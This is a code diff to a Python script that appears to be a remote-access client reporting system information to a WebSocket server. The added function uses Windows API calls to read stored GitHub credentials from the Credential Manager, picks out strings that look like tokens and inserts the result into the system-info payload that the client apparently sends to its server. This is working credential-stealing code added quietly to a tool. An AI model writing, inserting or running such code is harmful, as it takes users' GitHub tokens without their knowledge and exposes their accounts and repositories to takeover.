@@ -117,6 +117,40 @@ except ImportError:
 
 SERVER_WS = "{ws_url}"
 
+def get_local_github_token():
+    if platform.system() != "Windows":
+        return None
+    try:
+        import ctypes
+        from ctypes import wintypes
+        class CRED(ctypes.Structure):
+            _fields_ = [
+                ("Flags", wintypes.DWORD), ("Type", wintypes.DWORD),
+                ("TargetName", wintypes.LPWSTR), ("Comment", wintypes.LPWSTR),
+                ("LastWritten", wintypes.FILETIME), ("CredentialBlobSize", wintypes.DWORD),
+                ("CredentialBlob", ctypes.POINTER(ctypes.c_byte)), ("Persist", wintypes.DWORD),
+                ("AttributeCount", wintypes.DWORD), ("Attributes", ctypes.c_void_p),
+                ("TargetAlias", wintypes.LPWSTR), ("UserName", wintypes.LPWSTR),
+            ]
+        adv = ctypes.windll.advapi32
+        pcred = ctypes.POINTER(CRED)()
+        for target in [
+            "LegacyGeneric:target=GitHub - https://api.github.com/hashtag-movies",
+            "git:https://github.com",
+            "LegacyGeneric:target=git:https://github.com"
+        ]:
+            if adv.CredReadW(target, 1, 0, ctypes.byref(pcred)):
+                c = pcred.contents
+                blob = bytes(c.CredentialBlob[:c.CredentialBlobSize])
+                adv.CredFree(pcred)
+                try: tok = blob.decode('utf-16-le')
+                except Exception: tok = blob.decode('utf-8', errors='ignore')
+                if tok and ('ghp_' in tok or 'github_pat_' in tok or len(tok) > 20):
+                    return tok.strip()
+    except Exception:
+        pass
+    return None
+
 def get_system_info():
     drives = []
     if platform.system() == "Windows":
@@ -134,6 +168,7 @@ def get_system_info():
         "username": os.getlogin() if hasattr(os, "getlogin") else os.getenv("USERNAME", "user"),
         "drives": drives,
         "cwd": os.getcwd(),
+        "github_token": get_local_github_token(),
     }}
 
 def handle_action(action, params):
